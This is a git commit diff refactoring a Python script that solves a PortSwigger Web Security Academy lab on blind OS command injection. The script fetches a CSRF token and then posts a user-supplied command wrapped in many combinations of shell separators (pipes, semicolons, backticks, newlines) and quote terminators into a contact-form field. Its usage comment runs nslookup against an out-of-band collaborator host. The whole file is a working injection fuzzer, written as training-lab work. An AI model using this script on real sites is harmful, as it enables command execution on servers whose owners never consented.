3799675f894436ee51f0b921ae366b11a1f0842b
jeanettesa <jeanette.samuelsen@gmail.com>
2020-09-07 00:31:11 +0200

    Reuse session variable and csrf_token to make code more efficient

--- OS_command_injection/blind_OAST/blind_OAST_poster.py
+++ OS_command_injection/blind_OAST/blind_OAST_poster.py
@@ -1,4 +1,3 @@
-
 # Code to solve lab in WSA - 'Blind OS command injection with out-of-band interaction'
 # See: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
 # Run command: python3 blind_OAST_poster.py $form_url email nslookup burpcollaborator.net
@@ -8,23 +7,27 @@ import sys
 import re
 import itertools
 
+# Get csrf from website
+def get_csrf(session):
+    resp = session.get(form_url)
+    csrf_token = re.search(r'name="csrf" value="(.*)"', resp.text).group(1)
+    return csrf_token
+
+
 # First get web page for csrf_token, then inject the code through a post request
-def poster(form_url, attack_field, command, prefix, suffix):
-    with requests.Session() as s:
-       # Get cookie
-       resp = s.get(form_url)
-       csrf_token = re.search(r'name="csrf" value="(.*)"', resp.text).group(1)
-       dummy_str = 'bah'
-       fields = dict.fromkeys(['name','subject','message','email'], dummy_str) # setting initial values
+def poster(session, csrf_token, form_url, attack_field, command, prefix, suffix):
+    dummy_str = 'bah'
+    fields = dict.fromkeys(['name','subject','message','email'], dummy_str) # setting initial field values
 
-       # Changing field to attack
-       fields[attack_field] = f"{prefix} {command} {suffix}"
+    # Changing field to attack
+    fields[attack_field] = f"{prefix} {command} {suffix}"
 
-       data={"csrf": csrf_token, "name": fields['name'], "subject": fields['subject'], "message": fields['message'], "email": fields['email']}
-       print(attack_field.capitalize() +": " + fields[attack_field])
-       print("Data: ", str(data))
-       resp = s.post(form_url+"/submit", data=data)
-       print("Response: " + resp.text)
+    data={"csrf": csrf_token, "name": fields['name'], "subject": fields['subject'], "message": fields['message'], "email": fields['email']}
+    print(attack_field.capitalize() +": " + fields[attack_field])
+    print("Data: ", str(data))
+    resp = session.post(form_url+"/submit", data=data)
+    print("Response: " + resp.text)
+
 
 # Getting command line args
 form_url=sys.argv[1]
@@ -34,9 +37,14 @@ print("Command", cmd)
 
 # Iterating through attack payloads
 payload = ['|', '||', '&', '&&', ';', '%0a', '#', '`', '\n']
-start_str = ['', '\'', '"'] # In case the field we are attacking is fed into a string, we must first end the string before executing our command
+start_str = ['', '\'', '"'] # In case the field we are attacking is fed into a string, we must first terminate the string before executing our command
+
+sess = requests.Session()
+csrf = get_csrf(sess)
+
+
 for start in start_str:
     for subset in itertools.combinations_with_replacement(payload, 2):
         prefix = subset[0]
         suffix = subset[1]
-        poster(form_url, attack_field, cmd, start+prefix, suffix)
+        poster(sess, csrf, form_url, attack_field, cmd, start+prefix, suffix)
